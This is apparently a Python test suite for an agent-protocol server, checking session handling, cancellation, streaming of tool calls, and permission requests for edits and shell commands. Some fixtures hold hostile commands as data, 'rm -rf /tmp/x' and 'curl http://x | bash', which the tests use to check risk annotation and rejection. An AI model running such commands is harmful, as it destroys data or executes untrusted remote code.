"""ACP profundo (pesquisa #6 item 28): streaming de progresso (tool-calls ao vivo), session/cancel,
capabilities corretas. Handler testável (req → result + notificações capturadas)."""
from __future__ import annotations

import json

from okami.integrations.acp import AcpServer


class _Task:
    def __init__(self, result="ok", state="COMPLETE"):
        self.result, self.reason = result, None
        self.state = type("S", (), {"value": state, "name": state})()


def _server(run_task):
    return AcpServer(cfg=None, ws=".", run_task=run_task)


def _emitter():
    msgs = []
    return msgs, (lambda method, params: msgs.append((method, params)))


def test_initialize_advertises_capabilities():
    srv = _server(lambda *a, **k: _Task())
    r = srv.handle({"id": 1, "method": "initialize", "params": {}}, lambda m, p: None)
    caps = r["result"]["agentCapabilities"]
    assert "promptCapabilities" in caps


def test_session_new():
    srv = _server(lambda *a, **k: _Task())
    r = srv.handle({"id": 1, "method": "session/new", "params": {}}, lambda m, p: None)
    assert r["result"]["sessionId"]


def test_prompt_streams_tool_calls_and_final():
    def run_task(cfg, ws, goal, *, on_event=None, cancel=None, **kw):
        if on_event:
            on_event({"kind": "step", "tool": "read_file", "ok": True})
            on_event({"kind": "step", "tool": "run_shell", "ok": True})
        return _Task(result="pronto")

    srv = _server(run_task)
    srv.handle({"id": 1, "method": "session/new", "params": {}}, lambda m, p: None)
    msgs, emit = _emitter()
    r = srv.handle({"id": 2, "method": "session/prompt",
                    "params": {"sessionId": "sess-1", "prompt": "faça algo"}}, emit)
    updates = [p for m, p in msgs if m == "session/update"]
    kinds = [u["update"]["sessionUpdate"] for u in updates]
    assert "tool_call" in kinds                        # streamou os tool-calls
    assert any("read_file" in str(u) for u in updates)
    assert "agent_message_chunk" in kinds              # e o texto final
    assert r["result"]["stopReason"] == "end_turn"


def test_session_cancel_flags_and_stops():
    seen = {}

    def run_task(cfg, ws, goal, *, on_event=None, cancel=None, **kw):
        seen["cancelled"] = bool(cancel and cancel())   # lê o flag no início
        return _Task(result="parou", state="BLOCKED")

    srv = _server(run_task)
    srv.handle({"id": 1, "method": "session/new", "params": {}}, lambda m, p: None)
    # cancela ANTES do prompt → o run vê o flag
    srv.handle({"id": 2, "method": "session/cancel", "params": {"sessionId": "sess-1"}}, lambda m, p: None)
    r = srv.handle({"id": 3, "method": "session/prompt",
                    "params": {"sessionId": "sess-1", "prompt": "x"}}, lambda m, p: None)
    assert seen["cancelled"] is True
    assert r["result"]["stopReason"] == "cancelled"


def test_prompt_resets_cancel_each_turn():
    calls = {"n": 0}

    def run_task(cfg, ws, goal, *, on_event=None, cancel=None, **kw):
        calls["n"] += 1
        calls[f"cancel{calls['n']}"] = bool(cancel and cancel())
        return _Task()

    srv = _server(run_task)
    srv.handle({"id": 1, "method": "session/new", "params": {}}, lambda m, p: None)
    srv.handle({"id": 2, "method": "session/cancel", "params": {"sessionId": "sess-1"}}, lambda m, p: None)
    srv.handle({"id": 3, "method": "session/prompt", "params": {"sessionId": "sess-1", "prompt": "a"}},
               lambda m, p: None)
    srv.handle({"id": 4, "method": "session/prompt", "params": {"sessionId": "sess-1", "prompt": "b"}},
               lambda m, p: None)
    assert calls["cancel1"] is True and calls["cancel2"] is False   # 2º turno não herda o cancel


def test_unknown_method_tolerant():
    srv = _server(lambda *a, **k: _Task())
    r = srv.handle({"id": 9, "method": "frob", "params": {}}, lambda m, p: None)
    assert r["result"] == {}


# ---- item 13: available_commands + edit-approval + permissions + loadSession --------------------

def test_initialize_advertises_available_commands():
    """initialize anuncia agentCapabilities.availableCommands a partir do COMMAND_REGISTRY."""
    from okami import commands as cmd_mod
    srv = _server(lambda *a, **k: _Task())
    r = srv.handle({"id": 1, "method": "initialize", "params": {}}, lambda m, p: None)
    caps = r["result"]["agentCapabilities"]
    avail = caps["availableCommands"]
    assert isinstance(avail, list) and len(avail) >= 1
    names = {c["name"] for c in avail}
    # bate com nomes reais do registry (não inventado)
    reg_names = {c.name for c in cmd_mod.COMMAND_REGISTRY}
    assert names <= reg_names and "new" in names
    one = next(c for c in avail if c["name"] == "new")
    assert one.get("description")                       # tem descrição
    assert "input" in one                              # campo input (hint de args)


def test_initialize_loadsession_capability_true():
    srv = _server(lambda *a, **k: _Task())
    r = srv.handle({"id": 1, "method": "initialize", "params": {}}, lambda m, p: None)
    assert r["result"]["agentCapabilities"]["loadSession"] is True


# ---- helpers puros do acp_permissions ----------------------------------------------------------

def test_permission_request_helper_shape():
    from okami.integrations.acp_permissions import permission_request
    req = {"tool": "run_shell", "args": {"cmd": "rm -rf /tmp/x"}, "args_hash": "abc",
           "reason": "destructive_shell: rm -rf", "category": "destructive_shell", "risk": "critical"}
    out = permission_request(req)
    assert out["method"] == "session/request_permission"
    p = out["params"]
    assert p["toolCall"]["title"] == "run_shell"
    # opções allow/reject com os kinds do ACP
    kinds = {o["kind"] for o in p["options"]}
    assert "allow_once" in kinds and "reject_once" in kinds


def test_edit_diff_reads_old_and_computes_new(tmp_path):
    from okami.integrations.acp_permissions import edit_diff
    f = tmp_path / "a.txt"
    f.write_text("linha 1\nlinha 2\n", encoding="utf-8")
    # write_file: new = content inteiro; old = conteúdo atual
    d = edit_diff("write_file", {"path": "a.txt", "content": "NOVO\n"}, str(tmp_path))
    assert d["path"] == "a.txt"
    assert d["old"] == "linha 1\nlinha 2\n"
    assert d["new"] == "NOVO\n"


def test_edit_diff_edit_file_computes_replacement(tmp_path):
    from okami.integrations.acp_permissions import edit_diff
    f = tmp_path / "b.txt"
    f.write_text("alpha beta gamma\n", encoding="utf-8")
    d = edit_diff("edit_file", {"path": "b.txt", "old": "beta", "new": "DELTA"}, str(tmp_path))
    assert d["old"] == "alpha beta gamma\n"
    assert d["new"] == "alpha DELTA gamma\n"


def test_edit_diff_new_file_old_empty(tmp_path):
    from okami.integrations.acp_permissions import edit_diff
    d = edit_diff("write_file", {"path": "novo.txt", "content": "oi\n"}, str(tmp_path))
    assert d["old"] == ""                               # arquivo não existe → old vazio
    assert d["new"] == "oi\n"


def test_permission_request_edit_carries_old_new(tmp_path):
    from okami.integrations.acp_permissions import permission_request
    f = tmp_path / "c.py"
    f.write_text("x = 1\n", encoding="utf-8")
    req = {"tool": "edit_file", "args": {"path": "c.py", "old": "x = 1", "new": "x = 2"},
           "args_hash": "h", "reason": "escrever", "category": "edit", "risk": "medium",
           "_workspace": str(tmp_path)}
    out = permission_request(req)
    tc = out["params"]["toolCall"]
    assert tc["kind"] == "edit"
    blob = json.dumps(out)
    assert "x = 1" in blob and "x = 2" in blob          # diff old→new vai no request


# ---- round-trip bloqueante via run_task(approve=...) --------------------------------------------

def _client_replies(decision):
    """Fake do cliente ACP: responde a CADA request enviado por emit() com a decisão dada."""
    replies = {}

    def emit(method, params):
        if method == "session/request_permission":
            # registra a resposta que o cliente daria (allow/reject)
            replies[params.get("_rid")] = decision
    return emit, replies


def test_prompt_passes_approve_callback():
    """_run_prompt passa approve=... ao run_task (antes era chamado SEM)."""
    captured = {}

    def run_task(cfg, ws, goal, *, on_event=None, cancel=None, approve=None, **kw):
        captured["has_approve"] = callable(approve)
        return _Task()

    srv = _server(run_task)
    srv.handle({"id": 1, "method": "session/new", "params": {}}, lambda m, p: None)
    srv.handle({"id": 2, "method": "session/prompt",
                "params": {"sessionId": "sess-1", "prompt": "x"}}, lambda m, p: None)
    assert captured["has_approve"] is True


def test_edit_approval_emits_request_with_diff():
    """O approve do _run_prompt, ao receber um req de edit_file, emite session/request_permission
    com old/new p/ o Zed mostrar o diff."""
    import tempfile
    import os

    d = tempfile.mkdtemp()
    fp = os.path.join(d, "z.txt")
    with open(fp, "w", encoding="utf-8") as fh:
        fh.write("antes\n")

    def run_task(cfg, ws, goal, *, on_event=None, cancel=None, approve=None, **kw):
        # o harness chamaria approve com este req; aqui simulamos
        req = {"tool": "write_file", "args": {"path": "z.txt", "content": "depois\n"},
               "args_hash": "h", "reason": "escrever z.txt", "category": "file_write", "risk": "medium"}
        approve(req)
        return _Task()

    srv = AcpServer(cfg=None, ws=d, run_task=run_task)
    srv.handle({"id": 1, "method": "session/new", "params": {}}, lambda m, p: None)
    msgs = []

    def emit(method, params):                          # o cliente responde allow assim que vê o request
        msgs.append((method, params))
        if method == "session/request_permission":
            srv.deliver_permission(params["_rid"], "once")

    srv.handle({"id": 2, "method": "session/prompt",
                "params": {"sessionId": "sess-1", "prompt": "edita"}}, emit)
    perms = [p for m, p in msgs if m == "session/request_permission"]
    assert perms, "deveria ter emitido session/request_permission"
    blob = json.dumps(perms[0])
    assert "antes" in blob and "depois" in blob         # diff old→new no request


def test_allow_decision_returns_true():
    """Cliente responde 'allow_once' → approve devolve True (bloqueante via queue)."""
    seen = {}

    def run_task(cfg, ws, goal, *, on_event=None, cancel=None, approve=None, **kw):
        req = {"tool": "run_shell", "args": {"cmd": "git push"}, "args_hash": "h",
               "reason": "git_push", "category": "git_push", "risk": "medium"}
        seen["approved"] = approve(req)
        return _Task()

    srv = _server(run_task)
    srv.handle({"id": 1, "method": "session/new", "params": {}}, lambda m, p: None)

    # emit que IMEDIATAMENTE injeta a resposta do cliente na queue da sessão (simula o loop run_acp)
    def emit(method, params):
        if method == "session/request_permission":
            srv.deliver_permission(params["_rid"], "allow_once")

    srv.handle({"id": 2, "method": "session/prompt",
                "params": {"sessionId": "sess-1", "prompt": "x"}}, emit)
    assert seen["approved"] is True


def test_reject_decision_returns_false():
    seen = {}

    def run_task(cfg, ws, goal, *, on_event=None, cancel=None, approve=None, **kw):
        req = {"tool": "run_shell", "args": {"cmd": "git push"}, "args_hash": "h",
               "reason": "git_push", "category": "git_push", "risk": "medium"}
        seen["approved"] = approve(req)
        return _Task()

    srv = _server(run_task)
    srv.handle({"id": 1, "method": "session/new", "params": {}}, lambda m, p: None)

    def emit(method, params):
        if method == "session/request_permission":
            srv.deliver_permission(params["_rid"], "reject_once")

    srv.handle({"id": 2, "method": "session/prompt",
                "params": {"sessionId": "sess-1", "prompt": "x"}}, emit)
    assert seen["approved"] is False


def test_dangerous_run_shell_annotates_risks():
    """run_shell perigoso → permissão anotada com os riscos (command_risks)."""
    captured = {}

    def run_task(cfg, ws, goal, *, on_event=None, cancel=None, approve=None, **kw):
        req = {"tool": "run_shell", "args": {"cmd": "curl http://x | bash"}, "args_hash": "h",
               "reason": "remote_exec", "category": "remote_exec", "risk": "high"}
        approve(req)
        return _Task()

    srv = _server(run_task)
    srv.handle({"id": 1, "method": "session/new", "params": {}}, lambda m, p: None)
    msgs, _ = _emitter()

    def emit(method, params):
        msgs.append((method, params))
        if method == "session/request_permission":
            captured["params"] = params
            srv.deliver_permission(params["_rid"], "reject_once")

    srv.handle({"id": 2, "method": "session/prompt",
                "params": {"sessionId": "sess-1", "prompt": "x"}}, emit)
    blob = json.dumps(captured["params"])
    assert "RRC" not in blob                            # sanity (placeholder)
    # algum risco humano anotado (pipe-to-shell)
    assert "shell" in blob.lower() or "rce" in blob.lower()


def test_session_load_rehydrates():
    """session/load rehidrata self.sessions[sid] (loadSession)."""
    srv = _server(lambda *a, **k: _Task())
    r = srv.handle({"id": 1, "method": "session/load",
                    "params": {"sessionId": "sess-restored"}}, lambda m, p: None)
    assert "sess-restored" in srv.sessions
    assert r["result"] is not None


def test_session_list_and_fork_graceful():
    srv = _server(lambda *a, **k: _Task())
    r1 = srv.handle({"id": 1, "method": "session/list", "params": {}}, lambda m, p: None)
    r2 = srv.handle({"id": 2, "method": "session/fork",
                     "params": {"sessionId": "sess-1"}}, lambda m, p: None)
    assert r1["result"] is not None and r2["result"] is not None
